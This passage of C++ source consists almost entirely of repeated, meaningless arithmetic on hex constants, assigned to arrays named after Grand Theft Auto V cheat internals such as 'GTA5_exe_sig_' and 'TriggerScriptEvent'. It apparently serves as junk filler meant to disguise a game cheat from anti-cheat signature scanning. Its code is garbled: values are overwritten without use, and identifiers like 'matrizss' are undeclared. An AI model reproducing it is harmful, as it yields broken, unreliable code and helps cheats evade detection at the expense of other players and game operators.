			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<HashName>" + Estrutura.Model + "</HashName>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
